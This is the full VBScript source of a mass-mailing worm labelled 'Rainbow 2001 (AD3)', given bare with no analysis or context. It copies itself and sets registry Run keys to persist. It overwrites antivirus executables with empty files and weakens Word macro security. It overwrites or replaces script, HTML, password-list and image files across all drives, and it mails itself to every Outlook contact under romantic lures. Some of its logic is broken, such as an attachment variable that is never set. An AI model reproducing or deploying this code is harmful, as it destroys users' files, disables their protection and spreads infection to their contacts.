   rem  NAME - Rainbow 2001 (AD3) <v0204>
   On Error Resume Next
   dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
   eq=""
   ctr=0
   Set fso = CreateObject("Scripting.FileSystemObject")
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   vbscopy=file.ReadAll
   main()

   sub main()
   On Error Resume Next
   dim wscr,rr
   set wscr=CreateObject("WScript.Shell")
   rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
   if (rr>=1) then
   wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
   end if
   Set dirwin = fso.GetSpecialFolder(0)
   Set dirsystem = fso.GetSpecialFolder(1)
   Set dirtemp = fso.GetSpecialFolder(2)
   Set r = fso.GetFile(WScript.ScriptFullName)
   r.Copy(dirwin&"\AD3.vbs")
   fso.CreateTextFile(dirsystem&"\miss.vbs")
   fso.CreateTextFile(dirsystem&"\Kelly.vbs")
   fso.CreateTextFile(dirsystem&"\rainbow.vbs")
   fso.CreateTextFile("C:\Program Files\Norton AntiVirus\NMain.exe")
   fso.CreateTextFile("C:\Program Files\Norton AntiVirus\NAVW32.EXE")
   fso.CreateTextFile("C:\Program Files\Norton AntiVirus\nsched32.exe")
   fso.CreateTextFile("C:\Program Files\Symantec\LiveUpdate\LUAll.exe")
   fso.CreateTextFile("C:\Program Files\AntiViral Toolkit Pro\avpm.exe")
   fso.CreateTextFile("C:\Program Files\Trend PC-cillin 98\PCCWIN98.exe")
   fso.CreateTextFile("C:\Program Files\Trend PC-cillin 2000\pccmain.exe")
   fso.CreateTextFile("C:\Program Files\Trend PC-cillin 98 PLUS!\pccwin98.exe")
   regruns()
   html()
   spreadtoemail()
   listadriv()
   end sub

   sub regruns()
   On Error Resume Next
   Dim downread
   regcreate "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\"&Level,1,"REG_DWORD"
   regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\AD3",dirwin&"\ad3.vbs"
   regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\miss",dirsystem&"\miss.vbs"
   regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Kelly",dirsystem&"\Kelly.vbs"
   regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\rainbow",dirsystem&"\rainbow.vbs"
   regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\AD3","CScript.exe %windir%\AD3.vbs"
   regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\PCCIOMON.EXE","WSCRIPT.EXE %windir%\AD3.vbs"
   regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\Installed","1"
   regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\530\Path","C:\\"
   regcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ProxyServer",""
   downread=""
   downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
   if (downread="") then
    downread="c:\windows\desktop\"
   end if
   if (fileexist(dirsystem&"\ad3.vbs")=0) then
    regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","kelly-i-miss-you.rainbow"
   end if
   end sub

   sub listadriv
   On Error Resume Next
   Dim d,dc,s
   Set dc = fso.Drives
   For Each d in dc
   If d.DriveType = 2 or d.DriveType=3 Then
   folderlist(d.path&"\")
   end if
   Next
   listadriv = s
   end sub

   sub infectfiles(folderspec)
   On Error Resume Next
   dim f,f1,fc,ext,bp,s,bname,web,size
   set f = fso.GetFolder(folderspec)
   set fc = f.Files
   for each f1 in fc
   ext=fso.GetExtensionName(f1.path)
   size=f1.size
   ext=lcase(ext)
   s=lcase(f1.name)
   if (ext="vbs") or (ext="vbe") then
   set bp=fso.OpenTextFile(f1.path,2,true)
   bp.write vbscopy
   bp.close
   elseif(ext="jse") or (ext="js") or (ext="wsh") or (ext="css") or (ext="hta") or (ext="pwl") then
   set bp=fso.OpenTextFile(f1.path,2,true)
   bp.write vbscopy
   bp.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)
   elseif(ext="htm") or (ext="html") then
   set bp=fso.OpenTextFile(f1.path,2,true)
   bp.write vbscopy
   bp.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
   elseif(ext="gif") or (ext="jpg") or (ext="bmp") then
   set web=fso.CreateTextFile(f1.path&".vbe")
   web.write vbscopy
   web.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
   end if

   next
   end sub

   sub folderlist(folderspec)
   On Error Resume Next
   dim f,f1,sf
   set f = fso.GetFolder(folderspec)
   set sf = f.SubFolders
   for each f1 in sf
   infectfiles(f1.path)
   folderlist(f1.path)
   next
   end sub

   sub regcreate(regkey,regvalue)
   Set regedit = CreateObject("WScript.Shell")
   regedit.RegWrite regkey,regvalue
   end sub

   function regget(value)
   Set regedit = CreateObject("WScript.Shell")
   regget=regedit.RegRead(value)
   end function

   function fileexist(filespec)
   On Error Resume Next
   dim msg
   if (fso.FileExists(filespec)) Then
   msg = 0
   else
   msg = 1
   end if
   fileexist = msg
   end function

   function folderexist(folderspec)
   On Error Resume Next
   dim msg
   if (fso.GetFolderExists(folderspec)) then
   msg = 0
   else
   msg = 1
   end if
   fileexist = msg
   end function

   sub spreadtoemail()
   On Error Resume Next
   dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
   set regedit=CreateObject("WScript.Shell")
   set out=WScript.CreateObject("Outlook.Application")
   set mapi=out.GetNameSpace("MAPI")
   for ctrlists=1 to mapi.AddressLists.Count
   set a=mapi.AddressLists(ctrlists)
   x=1
   regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
   if (regv="") then
   regv=1
   end if
   if (int(a.AddressEntries.Count)>int(regv)) then
   for ctrentries=1 to a.AddressEntries.Count
   malead=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
   if (regad="") then
   set male=out.CreateItem(0)
    male.Recipients.Add(malead)
   Dim num1
   Randomize
   num1 = Int((4 * Rnd) + 1)
   if num1 = 1 then
    male.Subject = "fw: DO YOU MISS ME ?"
   elseif num1 = 2 then
    male.Subject = "fw: I MISS YOU VERY MUCH."
   elseif num1 = 3 then
    male.Subject = "fw: DO YOU COME BACK ?"
   elseif num1 = 4 then
    male.Subject = "fw: I MISS YOU SO I WAIT YOU."
   end if
    male.Body = vbcrlf&"Kelly...Where are you ? I will wait you 3 years.i miss you...Rainbow"
   Dim num2
   Randomize
   num1 = Int((4 * Rnd) + 1)
   if num2 = 1 then
    male.Attachments.Add(dirsystem&"\miss.vbs")
   elseif num2 = 2 then
    male.Attachments.Add(dirsystem&"\rainbow.vbs")
   elseif num2 = 3 then
    male.Attachments.Add(dirsystem&"\kelly.vbs")
   elseif num2 = 4 then
    male.Attachments.Add(dirsystem&"\530.vbs")
   end if
     male.Send
   regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
   end if
   x=x+1
   next
   regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
   else
   regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
   end if
   next
   Set out=Nothing
   Set mapi=Nothing

   end sub
